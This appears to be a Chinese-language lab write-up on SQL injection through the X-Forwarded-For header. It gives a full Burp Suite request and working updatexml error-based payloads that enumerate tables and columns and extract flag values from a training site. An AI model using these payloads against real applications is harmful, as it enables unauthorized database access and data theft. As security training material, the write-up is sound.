---
date: "2020-12-14T00:00:00Z"
description: Head 注入 -  X-Forwarded-For 注入 （XFF）
keywords: SQL注入, head
tags:
- SQL注入
- 安全
title: Head 注入 -  X-Forwarded-For 注入 （XFF）
---

# Head 注入 -  X-Forwarded-For 注入 （XFF）



## 注意

1. burpsuite http 文件有自己的格式， HEAD 信息之间 **不能有** 空格。
2. `X-Forwarded-For` 单词不要写错。
3. `X-Forwarded-For` 在直接请求时，burpsuite 抓包中没有。 因此需要手工传入。
4. 在每一步都需要仔细认真，**切忌焦躁、贪多** ，事情往往就在最后一步事情平常心而导致失败。 

## 使用 burpsuite

```http
POST /Pass-09/index.php HTTP/1.1
Host: inject2.lab.aqlab.cn:81
Content-Length: 30
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://inject2.lab.aqlab.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://inject2.lab.aqlab.cn:81/Pass-09/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
X-Forwarded-For: 192.168.1.11&amp;#039;, updatexml(1,concat(0x7e,database(),0x7e),1) ) -- gg 

username=admin&amp;amp;password=123456

```

## 查询 FLAG

**1. 确认 XFF 可用**

```
X-Forwarded-For: 192.168.1.11&amp;#039;, updatexml(1,concat(0x7e,database(),0x7e),1) ) -- gg 
```

![](https://nc0.cdn.zkaq.cn/md/8461/e7291a30b0fa1d8d107325a12994b1b0_87272.png)

**2. 查询表名**

```sql
select group_concat(table_name) from information_schema.tables where table_schema=database()
```

```
X-Forwarded-For: 192.168.1.11&amp;#039;, updatexml(1,concat(0x7e,   (select group_concat(table_name) from information_schema.tables where table_schema=database())   ,0x7e),1) ) -- gg 
```

&amp;gt; result:  `flag_head,ip,refer,uagent,user` 

![](https://nc0.cdn.zkaq.cn/md/8461/3e2050c6a2d112ad6ca1a4be9af58a5f_44280.png)

**3. 查询字段名**

```sql
select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#039;flag_head&amp;#039; 
```

```
X-Forwarded-For: 192.168.1.11&amp;#039;, updatexml(1,concat(0x7e,   (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#039;flag_head&amp;#039; )   ,0x7e),1) ) -- gg 
```

&amp;gt; result: Id,flag_h1

![](https://nc0.cdn.zkaq.cn/md/8461/9af47800b8c7abbe1fda4223c24e1459_48726.png)

**4. 查询数据**

```sql
select group_concat(flag_h1) from flag_head 
```

```
X-Forwarded-For: 192.168.1.11&amp;#039;, updatexml(1,concat(0x7e,   (select group_concat(flag_h1) from flag_head )   ,0x7e),1) ) -- gg 
```

&amp;gt; result:  zKaQ-YourHd,zKaQ-Refer,zKaQ-ipi

![](https://nc0.cdn.zkaq.cn/md/8461/76ad1a031d9b204c2537788e39809d2c_84160.png)


**5. updatexml 长度显示异常**

本以为结果 OK 了， 结果提交不了。 

自己分析上一次的返回截图， 发现其实返回结果并不全。 

**正常的应该是 `xx~` 结尾， 但此处不是**

![](https://nc0.cdn.zkaq.cn/md/8461/49e55df87ccb989ff19842c9c45ecb41_25478.png)


于是，直接查询字段， 使用 limit 限制返回结果数量。

```sql
select flag_h1 from flag_head limit 2,1
```

```
X-Forwarded-For: 192.168.1.11', updatexml(1,concat(0x7e,   (select flag_h1 from flag_head limit 2,1)   ,0x7e),1) ) -- gg 
```

> result:     XPATH syntax error: '~zKaQ-ipip~'

![](https://nc0.cdn.zkaq.cn/md/8461/bdf3da160835a6e8260816886f97c96f_88298.png)


## 0xGG

[BurpSuite 几个扩展的使用](https://zhuanlan.zhihu.com/p/27545785)

